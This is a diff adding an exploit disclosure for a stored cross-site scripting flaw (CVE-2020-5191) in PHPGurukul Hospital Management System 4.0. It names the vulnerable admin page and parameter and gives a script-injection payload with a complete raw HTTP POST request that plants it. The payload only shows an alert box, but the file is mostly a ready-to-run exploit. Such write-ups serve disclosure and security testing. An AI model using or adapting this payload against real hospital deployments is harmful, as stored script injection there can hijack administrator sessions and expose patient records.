@@ -1,0 +1,36 @@
+# Exploit Title: Hospital Management System 4.0 - Persistent Cross-Site Scripting
+# Google Dork: N/A
+# Date: 2020-01-02
+# Exploit Author: FULLSHADE
+# Vendor Homepage: https://phpgurukul.com/
+# Software Link: https://phpgurukul.com/hospital-management-system-in-php/
+# Version: v4.0
+# Tested on: Windows
+# CVE : CVE-2020-5191
+
+================ 1. - Cross Site Scripting (Persistent) ================
+
+URL  :  http://10.0.0.214/hospital/hospital/hms/admin/doctor-specilization.php
+Method   :  POST
+Parameter:  doctorspecilization
+Attack   : </td><script>alert("XSS");</script><td>
+
+POST /hospital/hospital/hms/admin/doctor-specilization.php HTTP/1.1
+Host: 10.0.0.214
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://10.0.0.214/hospital/hospital/hms/admin/doctor-specilization.php
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 97
+Origin: http://10.0.0.214
+DNT: 1
+Connection: close
+Cookie: PHPSESSID=g1mpom762nglpeptn51b4rg5h5
+Upgrade-Insecure-Requests: 1
+Cache-Control: max-age=0
+
+doctorspecilization=%3C%2Ftd%3E%3Cscript%3Ealert%28%22XSS%22%29%3B%3C%2Fscript%3E%3Ctd%3E&submit=
+
+?doctorspecilization parameter is vulnerable to create a persistent and stored XSS exploit in the application depending on how it's viewed
